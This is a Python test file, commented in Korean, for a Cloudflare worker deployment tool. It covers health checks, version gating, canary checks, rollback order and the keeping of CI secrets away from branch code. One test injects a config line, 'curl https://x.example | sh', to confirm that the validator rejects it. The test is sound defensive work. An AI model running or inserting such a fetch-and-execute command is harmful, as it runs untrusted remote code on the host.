#!/usr/bin/env python3
"""1.39 [DEPLOY-01] tools/deploy_worker.py의 안전장치 시험(바깥과 닿지 않는 부분만).  python3 tools/test_deploy_worker.py"""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import deploy_worker as d  # noqa: E402

OLD = [
    {"type": "d1", "name": "DB", "id": "11111111-2222-3333-4444-555555555555"},
    {"type": "version_metadata", "name": "CF_VERSION_METADATA"},
    {"type": "secret_text", "name": "ADMIN_PASSWORD"},
    {"type": "plain_text", "name": "SHARE_BASE_URL", "text": "https://s.bamnat.app"},
]


class DeployWorkerTest(unittest.TestCase):
    def test_company_health_reads_the_database(self):
        # 1.40 [RVD-08] 검토 SRV-03: 비밀값이 다 있어도 표 판·config 읽기가 틀리면 새 판은 실패예요.
        good = {"database": True, "password": True, "salt": True}
        self.assertTrue(d.company_ok(200, {**good, "schema": True, "config": True}, True))
        self.assertFalse(d.company_ok(200, good, True))
        self.assertFalse(d.company_ok(503, {**good, "schema": False, "config": True}, True))
        # 되돌린 옛 판은 deep을 몰라요.
        self.assertTrue(d.company_ok(200, good, False))

    def test_finds_bindings_in_version_view(self):
        view = {"id": "v", "resources": {"script": {}, "bindings": OLD}}
        self.assertEqual(d.find_bindings(view), OLD)
        self.assertEqual(d.find_bindings({"resources": {}}), [])

    def test_missing_bindings_and_plain_vars(self):
        new = [b for b in OLD if b["name"] != "SHARE_BASE_URL"]
        lost = d.missing_bindings(OLD, new)
        self.assertEqual(lost, {"SHARE_BASE_URL": "plain_text"})
        self.assertEqual(d.plain_vars(OLD, lost), {"SHARE_BASE_URL": "https://s.bamnat.app"})
        # 비밀값은 값이 없어 다시 넣지 않아요: 빠지면 멈춤으로 가요.
        self.assertEqual(d.plain_vars(OLD, {"ADMIN_PASSWORD": "secret_text"}), {})
        self.assertEqual(d.missing_bindings(OLD, OLD + [{"type": "r2_bucket", "name": "BACKUP"}]), {})

    def test_fill_config_from_live_binding(self):
        text = 'database_id = "REPLACE_WITH_D1_DATABASE_ID"\n'
        out = d.fill_config(text, d.WORKERS["company"]["fill"], OLD)
        self.assertIn("11111111-2222-3333-4444-555555555555", out)
        with self.assertRaises(d.Stop):
            d.fill_config(text, d.WORKERS["company"]["fill"], [])
        with self.assertRaises(d.Stop):
            d.fill_config('id = "REPLACE_WITH_SOMETHING"\n', {}, OLD)

    def test_real_configs_fill(self):
        server = Path(__file__).resolve().parent.parent / "server"
        kv = [{"type": "kv_namespace", "name": "SHARES", "namespace_id": "abc123"}]
        share = d.fill_config((server / "share-worker/wrangler.toml").read_text(encoding="utf-8"), d.WORKERS["share"]["fill"], kv)
        self.assertIn('"abc123"', share)
        company = d.fill_config((server / "company-worker/wrangler.toml").read_text(encoding="utf-8"), d.WORKERS["company"]["fill"], OLD)
        self.assertIn("17 * * * *", d.crons_of(company))
        self.assertIsNone(d.crons_of(share))

    def test_current_versions_and_split(self):
        self.assertEqual(d.current_versions({"versions": [{"version_id": "a", "percentage": 100}]}), [("a", 100.0)])
        self.assertEqual(len(d.current_versions({"versions": [{"version_id": "a", "percentage": 90}, {"version_id": "b", "percentage": 10}]})), 2)

    def test_version_order(self):
        self.assertLess(d.version_tuple("1.38.2"), d.version_tuple("1.39.0"))
        self.assertLess(d.version_tuple("1.39.0"), d.version_tuple("1.39.1"))
        self.assertEqual(d.version_tuple("1.39.0"), d.version_tuple("1.39.0"))

    def test_company_compares_with_its_own_live_version(self):
        # 2.0.0 [RVD-19] 회사는 앞 판 메시지의 판과 비교해요(공유 서버 판이 아니라).
        view = {"id": "v", "annotations": {"workers/message": "2.0.0 166802eb 검토 갈래 D", "workers/tag": "166802eb0000"},
                "resources": {"bindings": OLD}}
        self.assertEqual(d.message_version(view), "2.0.0")
        self.assertEqual(d.live_version("company", "http://127.0.0.1:9", view), "2.0.0")
        # main(1.39.0)을 2.0.0 위에 올리려 하면 멈춰요.
        self.assertIn("낮아요", d.version_gate("company", "1.39.0", "2.0.0", False))
        self.assertIsNone(d.version_gate("company", "1.39.0", "2.0.0", True))
        self.assertIsNone(d.version_gate("company", "2.0.0", "2.0.0", False))
        self.assertIsNone(d.version_gate("company", "2.0.1", "2.0.0", False))
        # 판 이름을 모르면 회사는 멈추고, 공유는 그대로 올려요(공유는 health가 판을 알려 줘요).
        self.assertIsNone(d.message_version({"annotations": {"workers/message": "자동 되돌리기 1234abcd"}}))
        self.assertIsNone(d.message_version({"annotations": {"workers/triggered_by": "upload"}}))
        self.assertIsNone(d.message_version({"annotations": {"workers/message": "1.39 고침"}}))
        self.assertIn("알 수 없어요", d.version_gate("company", "2.0.0", None, False))
        self.assertIsNone(d.version_gate("company", "2.0.0", None, True))
        self.assertIsNone(d.version_gate("share", "2.0.0", None, False))
        self.assertEqual(d.message_version({"metadata": {"message": "1.39.1 49c7ddb8 x"}}), "1.39.1")

    def test_company_health_says_its_version(self):
        # 2.0.0 [PC-32] 회사 /api/admin/health가 판 이름을 알려 주면 지금 판은 그 값, 새 판 health는 그 값이 올린 판과 같아야 해요.
        good = {"database": True, "password": True, "salt": True, "schema": True, "config": True}
        self.assertTrue(d.company_ok(200, {**good, "version": "2.0.0"}, True, "2.0.0"))
        self.assertFalse(d.company_ok(200, {**good, "version": "1.39.0"}, True, "2.0.0"))
        self.assertTrue(d.company_ok(200, good, False, "2.0.0"))  # 판 이름이 없는 옛 판(되돌린 판)은 건너뛰어요
        seen = []
        real = d.get
        try:
            d.get = lambda url: (seen.append(url), (200, '{"database":true,"version":"2.0.0"}'))[1]
            view = {"annotations": {"workers/message": "1.39.0 0b62510b x"}}
            self.assertEqual(d.live_version("company", "https://api.example", view), "2.0.0")
            self.assertEqual(seen, ["https://api.example/api/admin/health"])
            d.get = lambda url: (200, '{"database":true}')  # 2.0.0 앞 판: health에 판이 없으면 메시지로
            self.assertEqual(d.live_version("company", "https://api.example", view), "1.39.0")
            d.get = lambda url: (200, '{"version":"x"}')
            self.assertIsNone(d.live_version("company", "https://api.example", {"annotations": {}}))
        finally:
            d.get = real

    def test_upload_version_id(self):
        nd = '{"type":"wrangler-session"}\n{"type":"version-upload","version_id":"0f0f0f0f-1111-2222-3333-444444444444"}\n'
        self.assertEqual(d.upload_version_id(nd, ""), "0f0f0f0f-1111-2222-3333-444444444444")
        self.assertEqual(d.upload_version_id("", "Worker Version ID: 0f0f0f0f-1111-2222-3333-555555555555"), "0f0f0f0f-1111-2222-3333-555555555555")
        self.assertIsNone(d.upload_version_id("", "nothing"))

    # ---- 2.0.0 [RVQ-01~04] 검토 SRV-02·SRV-04·I21c-02·U21-09 ----

    def test_config_only_known_keys(self):
        ok = (Path(__file__).resolve().parent.parent / "server/company-worker/wrangler.toml").read_text(encoding="utf-8")
        self.assertEqual(d.config_problems(ok, "company"), [])
        bad = ok + '\n[build]\ncommand = "curl https://x.example | sh"\n'
        self.assertIn("모르는 칸 [build]", d.config_problems(bad, "company"))
        self.assertTrue(any("이름" in x for x in d.config_problems(ok, "share")))
        self.assertTrue(d.config_problems("name = [", "company"))
        share = (Path(__file__).resolve().parent.parent / "server/share-worker/wrangler.toml").read_text(encoding="utf-8")
        self.assertEqual(d.config_problems(share, "share"), [])

    def test_failing_test_names(self):
        tap = "ok 1 - a\nnot ok 2 - login counts at once # TODO\n  ---\nnot ok 3 - test/accounts.test.mjs\n# fail 1\n"
        self.assertEqual(d.failing_tests(tap), ["login counts at once"])
        spec = "✔ fine (2ms)\n✖ passkey needs user verification (12.5ms)\n✖ failing tests:\n✖ passkey needs user verification (12.5ms)\n"
        self.assertEqual(d.failing_tests(spec), ["passkey needs user verification"])
        self.assertEqual(d.failing_tests("all good"), [])

    def test_failing_places_name_and_line_like_the_date_watch(self):
        """[U60-02] 실패한 시험 이름·줄이 날짜 시험 결과(date_watch)와 같은 모양이라 어제 main과 견줄 수 있어요."""
        tap = ("ok 1 - a\nnot ok 2 - 새해 첫날 시험\n  ---\n  location: '/w/server/company-worker/test/village-r.test.mjs:41:3'\n"
               "  failureType: 'testCodeFailure'\n  ...\nnot ok 3 - test/village-r.test.mjs\n# fail 1\n")
        self.assertEqual([{"name": "village-r.test.mjs › 새해 첫날 시험", "at": "village-r.test.mjs:41"}], d.failing_places(tap))
        spec = ("✖ passkey needs user verification (12.5ms)\n  AssertionError [ERR_ASSERTION]: x\n"
                "      at TestContext.<anonymous> (file:///w/test/accounts.test.mjs:88:9)\n✖ failing tests:\n"
                "✖ passkey needs user verification (12.5ms)\n      at TestContext.<anonymous> (file:///w/test/accounts.test.mjs:88:9)\n"
                "✖ 줄 없음 (1ms)\n  boom\n")
        self.assertEqual([{"name": "accounts.test.mjs › passkey needs user verification", "at": "accounts.test.mjs:88"},
                          {"name": "줄 없음", "at": ""}], d.failing_places(spec))
        self.assertEqual([], d.failing_places("all good"))

    def test_canary_verdict(self):
        self.assertEqual(d.canary_verdict({"n": 10, "err": 5}, {"n": 900, "err": 0})[0], "few")
        self.assertEqual(d.canary_verdict({"n": 100, "err": 1, "ms": 9000}, {"n": 900, "err": 0, "ms": 81000})[0], "ok")
        self.assertEqual(d.canary_verdict({"n": 100, "err": 8, "ms": 9000}, {"n": 900, "err": 9, "ms": 81000})[0], "worse")
        # 앞 판도 비슷하게 실패하면(바깥 서비스 탓 등) 새 판 탓이 아니에요.
        self.assertEqual(d.canary_verdict({"n": 100, "err": 8}, {"n": 900, "err": 70})[0], "ok")
        self.assertEqual(d.canary_verdict({"n": 100, "err": 0, "ms": 100000}, {"n": 900, "err": 0, "ms": 90000})[0], "worse")

    def test_view_annotation_tag(self):
        view = {"id": "x", "annotations": {"workers/tag": "0123456789ab", "workers/message": "2.0.0 01234567 why"}}
        self.assertEqual(d.view_annotation(view, "workers/tag"), "0123456789ab")
        self.assertIsNone(d.view_annotation({"annotations": {}}, "workers/tag"))

    def test_ref_verdict(self):
        heads = {"claude/project-thread-f33c16"}
        self.assertIsNone(d.ref_verdict("main", False, heads, False))
        self.assertIsNone(d.ref_verdict("claude/project-thread-f33c16", False, heads, False))
        self.assertIsNotNone(d.ref_verdict("someone/else", False, heads, False))
        self.assertIsNone(d.ref_verdict("0123abcd", True, heads, False))
        self.assertIsNone(d.ref_verdict("0123abcd", False, heads, True))
        self.assertIsNotNone(d.ref_verdict("0123abcd", False, heads, False))
        self.assertIsNotNone(d.ref_verdict("", False, heads, False))

    def test_summary_three_lines(self):
        lines = d.summary_lines("시험", ["login counts at once"])
        self.assertEqual(len(lines), 3)
        self.assertIn("시험", lines[0])
        self.assertIn("`login counts at once`", lines[1])
        self.assertIn("고쳐", lines[2])
        self.assertIn("해당 없음", d.summary_lines("앞 판")[1])
        for stage in ("ref", "시험", "번들", "스키마 호환", "설정", "앞 판", "판 이름", "올리기", "바인딩", "카나리", "확인", "되돌리기"):
            self.assertIn(stage, d.NEXT_STEP)

    def _fake_cloud(self, status_after_undo, crons_now=("*/5 * * * *", "17 * * * *")):
        """undo가 부르는 바깥(배포·상태·정기 작업·health)을 가짜로."""
        calls = []
        state = {"crons": sorted(crons_now)}

        def fake_run(cmd, cwd, extra_env=None, check=True, stage="", clean_env=False):
            calls.append(" ".join(cmd[-8:]))
            return type("P", (), {"returncode": 0, "stdout": "", "stderr": ""})()

        def fake_sched(worker, crons=None):
            if crons is not None:
                state["crons"] = sorted(crons)
                calls.append(f"cron {sorted(crons)}")
            return state["crons"]
        patches = {"run": fake_run, "wrangler_json": lambda args, cwd: {"versions": status_after_undo},
                   "schedules": fake_sched, "healthy": lambda *a, **k: (True, "health 200")}
        return calls, state, patches

    def _patched(self, patches):
        real = {k: getattr(d, k) for k in patches}
        real_sleep = d.time.sleep
        for k, v in patches.items():
            setattr(d, k, v)
        d.time.sleep = lambda s: None

        def restore():
            for k, v in real.items():
                setattr(d, k, v)
            d.time.sleep = real_sleep
        return restore

    def test_undo_restores_crons_and_checks_status(self):
        r = d.Ready("company", "old-0000-id", "new-1111-id", "2.0.0", "1.39.0", "")
        r.deployed, r.crons_before = True, ["17 * * * *"]
        calls, state, patches = self._fake_cloud([{"version_id": "old-0000-id", "percentage": 100}])
        restore = self._patched(patches)
        try:
            d.undo(r, Path("."), "확인")
        finally:
            restore()
        self.assertTrue(any("old-0000-id@100%" in c for c in calls))
        self.assertEqual(state["crons"], ["17 * * * *"])
        self.assertFalse(r.deployed)

    def test_undo_that_did_not_take_is_loud(self):
        r = d.Ready("company", "old-0000-id", "new-1111-id", "2.0.0", "1.39.0", "")
        r.deployed = True
        _, _, patches = self._fake_cloud([{"version_id": "new-1111-id", "percentage": 100}])
        restore = self._patched(patches)
        try:
            with self.assertRaises(d.Stop) as e:
                d.undo(r, Path("."), "확인")
        finally:
            restore()
        self.assertEqual(e.exception.stage, "되돌리기")

    def test_both_rolls_back_the_first_when_the_second_fails(self):
        order = []

        def fake_stage(w, src, work, sha, reason, allow_older):
            order.append(f"upload {w}")
            return d.Ready(w, f"old-{w}", f"new-{w}", "2.0.0", "2.0.0", "")

        def fake_live(r, work, sha, reason):
            order.append(f"live {r.worker}")
            r.deployed = True
            if r.worker == "share":
                r.deployed = False  # go_live가 자기 것은 되돌리고 멈춰요
                raise d.Stop("share health 실패", stage="확인")

        def fake_undo(r, work, why):
            order.append(f"undo {r.worker}")
        patches = {"account": lambda: None, "stage_upload": fake_stage, "canary": lambda r, work, sha: order.append("canary company"),
                   "go_live": fake_live, "undo": fake_undo}
        restore = self._patched(patches)
        try:
            with self.assertRaises(d.Stop):
                d.ship(["company", "share"], Path("."), "deploy", "abc123456789", "test", False)
        finally:
            restore()
        # 둘 다 올리고 대조한 뒤에야 손님을 받고, 뒤의 것이 실패하면 앞의 것도 되돌려요.
        self.assertEqual(order, ["upload company", "upload share", "canary company", "live company", "live share", "undo company"])

    def test_check_mode_touches_no_traffic(self):
        order = []
        patches = {"account": lambda: None,
                   "stage_upload": lambda w, *a: order.append(w) or d.Ready(w, "o", "n", "2.0.0", "2.0.0", ""),
                   "canary": lambda *a: order.append("canary"), "go_live": lambda *a: order.append("live")}
        restore = self._patched(patches)
        try:
            d.ship(["company", "share"], Path("."), "check", "abc", "", False)
        finally:
            restore()
        self.assertEqual(order, ["company", "share"])

    def test_workflow_keeps_the_token_away_from_branch_code(self):
        import re
        wf = (Path(__file__).resolve().parents[2] / ".github/workflows/deploy-server.yml").read_text(encoding="utf-8")
        jobs = wf.split("\njobs:\n", 1)[1]
        parts = re.split(r"(?m)^  ([a-z]+):\n", jobs)
        blocks = dict(zip(parts[1::2], parts[2::2]))
        self.assertEqual(sorted(blocks), ["build", "explain", "gate", "ship", "test"])
        # 고른 브랜치의 코드가 도는 build와 실패를 풀어 주는 explain에는 비밀값이 없어요.
        self.assertNotIn("secrets.", blocks["build"])
        self.assertNotIn("secrets.", blocks["explain"])
        self.assertNotIn("path: target", blocks["explain"])
        self.assertIn("date_watch.py explain", blocks["explain"])
        self.assertIn("name: build-fail", blocks["build"])
        self.assertIn("--phase build", blocks["build"])
        # 토큰은 job 전체 env가 아니라 그 단계 env에만.
        for name in ("gate", "ship"):
            head = blocks[name].split("    steps:", 1)[0]
            self.assertNotIn("CLOUDFLARE_API_TOKEN", head, name)
        self.assertIn("secrets.CLOUDFLARE_API_TOKEN", blocks["ship"])
        # ship은 고른 브랜치를 받지 않아요(main의 도구 + build가 만든 파일만).
        self.assertNotIn("needs.gate.outputs.sha }}\n          path", blocks["ship"])
        self.assertNotIn("path: target", blocks["ship"])
        self.assertIn("github.ref == 'refs/heads/main'", blocks["gate"])
        # 모든 actions/checkout은 열쇠를 .git에 남기지 않아요.
        self.assertEqual(wf.count("actions/checkout@"), wf.count("persist-credentials: false"))
        # 바깥 액션은 커밋 번호로 묶어요.
        for line in wf.splitlines():
            if "uses:" in line:
                self.assertRegex(line, r"uses: [\w./-]+@[0-9a-f]{40}")

    def test_build_runs_branch_code_without_scripts_or_keys(self):
        import inspect
        src = inspect.getsource(d.build)
        self.assertIn("--ignore-scripts", src)
        self.assertIn("clean_env=True", src)
        self.assertNotIn("CLOUDFLARE_API_TOKEN", {k for k in d.SAFE_ENV})
        self.assertNotIn("GITHUB_TOKEN", d.SAFE_ENV)
        lock = (Path(__file__).resolve().parent / "deploy/package-lock.json").read_text(encoding="utf-8")
        self.assertIn('"node_modules/wrangler": {\n      "version": "4.150.0"', lock)


if __name__ == "__main__":
    unittest.main()
